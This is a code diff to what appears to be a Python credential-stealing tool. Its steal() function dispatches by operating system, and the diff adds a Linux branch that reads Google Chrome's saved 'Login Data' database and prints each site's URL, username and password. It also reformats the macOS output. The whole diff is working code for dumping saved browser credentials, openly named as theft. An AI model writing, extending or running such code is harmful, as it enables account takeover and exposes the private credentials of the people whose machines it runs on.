@@ -34,7 +34,35 @@ def steal():
 		return steal_windows()
 	elif platform.system()=='Darwin':
 		return steal_osx()
+	elif platform.system()=='Linux':
+		# Linux has 3 types of storage, basic,keyring and wallet, try everything then return
+		return steal_linux_basic()
 	return("[-] "+platform.system()+" is not supported.")
+# Decrypt Linux part one
+def steal_linux_basic():
+	# Recovered list
+	recovered = list()
+	# Get the passwords
+	data = query_db(os.path.expanduser('~/.config/google-chrome/Default/Login Data'))
+	# Are there any passwords?
+	if len(data) > 0:
+		# Loop through the passwords
+		for result in data:
+			# If the URL is blank,print it as (Unknown)
+			if(len(result[0]) <= 0):
+				result[0] = "(Unknown)"
+			# If the username is blank,say so
+			if(len(result[1]) <= 0):
+				result[1] = "(Blank)"
+			# If the password is blank,say so
+			if(len(result[2]) <= 0):
+				result[2] = "(Blank)"
+			# Append to results
+			recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=result[2]))
+		return recovered
+	else:
+		# There are no saved passwords
+		return('[-] There are no saved passwords')
 # OSX part
 def steal_osx():
 	# Recovered list
@@ -83,7 +111,7 @@ def steal_osx():
 					# If the password is blank,say so
 					if(len(password) <= 0):
 						password = "(Blank)"
-					recovered.append("[+] URL:{url}\nUsername:{user}\nPassword:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
+					recovered.append("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
 			except subprocess.CalledProcessError:
 				pass
 		return recovered
